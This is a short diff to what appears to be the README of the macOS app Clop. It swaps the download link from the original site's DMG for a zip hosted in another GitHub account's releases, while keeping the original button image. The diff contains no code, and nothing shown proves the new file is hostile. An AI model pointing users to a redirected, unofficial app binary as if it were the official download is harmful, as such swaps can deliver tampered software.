@@ -6,7 +6,7 @@
 </p>
 
 <p align="center">
-    <a href="https://files.lowtechguys.com/releases/Clop.dmg">
+    <a href="https://github.com/SoBloxsy/Clop/releases/download/Release/Clop.app.zip">
         <img width=200 src="https://files.lowtechguys.com/macos-app.svg">
     </a>
 </p>
